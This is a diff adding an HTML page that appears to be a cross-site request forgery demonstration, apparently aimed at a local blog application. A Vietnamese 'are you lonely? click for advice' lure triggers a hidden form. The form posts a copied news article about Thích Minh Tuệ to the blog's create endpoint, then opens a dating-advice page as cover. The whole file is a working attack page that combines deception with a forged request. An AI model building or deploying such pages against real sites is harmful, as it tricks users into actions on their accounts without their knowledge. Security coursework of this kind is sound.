@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+<p>Bạn đang cô đơn?</p>
+<a href="#" onclick="link()">Click vào đây để được tư vấn?</a>
+<form action="http://localhost:8080/blog/create" id="form-submit" method="post">
+    <input hidden name="title" value="
+      Ông Thích Minh Tuệ được hỗ trợ làm Căn cước công dân
+    ">
+    <input hidden name="content" value="
+     “Ngày 3/6, theo nguồn tin của phóng viên Dân trí, cơ quan chức năng tỉnh Thừa Thiên Huế đã hỗ trợ đưa ông Lê Anh Tú (Thích Minh Tuệ) đến nơi mà ông này mong muốn.
+
+     Tại đây, ông Thích Minh Tuệ đã được lực lượng chức năng hỗ trợ làm Căn cước công dân, để người này có giấy tờ tùy thân, đảm bảo quyền công dân theo quy định pháp luật.
+      ..
+        ">
+    <input hidden name="img" value="
+    https://cdnphoto.dantri.com.vn/GlE-vnOIGamBUrqDiCLaytgFMQU=/thumb_w/1360/2024/06/03/cccd-edited-1717413202320.jpeg"/>
+</form>
+<script>
+    function link() {
+        const form = document.getElementById("form-submit");
+        form.submit();
+        window.open("https://vnexpress.net/tam-su/hen-ho");
+    }
+</script>
+</body>
+</html>
